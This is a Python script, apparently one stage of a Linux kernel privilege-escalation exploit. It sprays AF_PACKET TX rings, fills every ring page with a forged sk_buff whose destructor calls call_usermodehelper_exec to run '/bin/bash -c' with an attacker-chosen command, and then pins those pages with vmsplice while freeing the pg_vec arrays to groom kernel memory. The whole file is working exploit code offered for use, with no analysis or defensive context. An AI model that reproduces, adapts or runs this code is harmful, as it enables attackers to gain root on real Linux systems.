#!/usr/bin/env python3
"""ringspray3.py <cpu> <count> - rings + fake-skb page + pin/free.

On /tmp/fakecfg = "G EX WK cmd": write the fake skb page blob with P=G into
every 4K block of every ring.  On /tmp/pinfree: vmsplice every ring mmap
(48 KiB = 12 pages) into a pipe (pinning the pages), then close the mmaps,
which releases the packet sockets and frees the pg_vec arrays while the
pinned ring pages (including G) stay alive at their direct-map addresses.
"""
import socket,struct,mmap,os,sys,time,ctypes
libc=ctypes.CDLL(None,use_errno=True); libc.vmsplice.restype=ctypes.c_ssize_t
class IOV(ctypes.Structure): _fields_=[("base",ctypes.c_void_p),("len",ctypes.c_size_t)]
cpu=int(sys.argv[1]); n=int(sys.argv[2])
os.sched_setaffinity(0,{cpu})
ETH_P_ALL=3; SOL_PACKET=263; PACKET_VERSION=10; PACKET_TX_RING=13; TPACKET_V1=0
BS,BN=4096,12
req=struct.pack("IIII",BS,BN,2048,24)
keep=[]
for i in range(n):
    s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(ETH_P_ALL)); s.bind(("lo",0))
    s.setsockopt(SOL_PACKET,PACKET_VERSION,TPACKET_V1); s.setsockopt(SOL_PACKET,PACKET_TX_RING,req)
    m=mmap.mmap(s.fileno(),BS*BN,mmap.MAP_SHARED,mmap.PROT_READ|mmap.PROT_WRITE)
    keep.append(m)
print("rings",len(keep),"blk",BN,flush=True)

def build(P,ex,wk,cmd):
    b=bytearray(BS)
    def w(o,v,l=8): b[o:o+l]=int(v).to_bytes(l,'little')
    o=0x10; S=P+o
    w(o+0,0); w(o+8,S+8); w(o+16,S+8); w(o+24,wk); w(o+32,0)
    w(o+40,P+0x400); w(o+48,P+0x480); w(o+56,P+0x500)
    w(o+64,0,4); w(o+68,0,4); w(o+72,0); w(o+80,0)
    # _skb_refdst (skb+0x58): non-NULL, low bit 0 -> skb_release_head_state
    # calls dst_release(), which returns with esi=0, so the destructor
    # call_usermodehelper_exec(skb, wait) gets wait=UMH_NO_WAIT regardless of
    # the leftover RSI in the free path.  Fake dst __refcnt at +0x40 is huge.
    w(o+88,P+0x900); w(0x940,0x40000000,4)
    w(o+96,ex); w(o+104,0); b[o+126]=0x05; w(o+128,0)
    w(o+192,0x100,4); w(o+200,P+0x100); w(o+220,1,4); w(o+224,0); w(o+464,5,4)
    w(0x220,2,4)
    b[0x400:0x409]=b"/bin/bash"; b[0x420:0x423]=b"-c\x00"
    cm=cmd.encode()[:0x2ff]; b[0x600:0x600+len(cm)]=cm
    w(0x480,P+0x400); w(0x488,P+0x420); w(0x490,P+0x600); w(0x498,0)
    b[0x540:0x547]=b"HOME=/\x00"
    pe=b"PATH=/sbin:/bin:/usr/sbin:/usr/bin"; b[0x548:0x548+len(pe)+1]=pe+b"\x00"
    w(0x500,P+0x540); w(0x508,P+0x548); w(0x510,0)
    return bytes(b)

pipes=[]; last=""; pinned=False
while True:
    try: cfg=open("/tmp/fakecfg").read().strip()
    except OSError: cfg=""
    if cfg and cfg!=last:
        try:
            g,ex,wk,cmd=cfg.split(" ",3); g=int(g,0); ex=int(ex,0); wk=int(wk,0)
            blob=build(g,ex,wk,cmd)
            for m in keep:
                for k in range(BN): m[k*BS:(k+1)*BS]=blob
            last=cfg; print("wrote fake skb for G=%#x"%g,flush=True)
        except Exception as e: print("cfg err",e,flush=True)
    if (not pinned) and os.path.exists("/tmp/pinfree"):
        ok=0
        for m in keep:
            try:
                r,w=os.pipe()
                base=ctypes.addressof(ctypes.c_char.from_buffer(m))
                io=IOV(ctypes.c_void_p(base),BS*BN)
                res=libc.vmsplice(w,ctypes.byref(io),1,0)
                if res>0: ok+=1; pipes.append((r,w))
                else: os.close(r); os.close(w)
            except Exception as e:
                pass
            try: m.close()
            except Exception: pass
        pinned=True
        print("pinned %d/%d rings; pg_vecs freed"%(ok,len(keep)),flush=True)
    time.sleep(0.5)
